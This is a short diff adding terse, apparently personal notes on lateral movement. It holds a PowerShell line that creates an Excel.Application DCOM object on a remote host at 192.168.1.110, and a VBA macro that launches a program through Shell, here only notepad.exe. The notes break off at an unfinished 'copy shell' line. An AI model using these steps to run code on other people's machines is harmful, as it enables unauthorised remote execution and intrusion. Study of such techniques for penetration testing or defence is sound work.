@@ -1,0 +1,7 @@
+1) for dcom
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+$com | Get-Member
+2) "excel"Sub mymacro()
+Shell ("notepad.exe")
+End Sub
+3) copy shell::
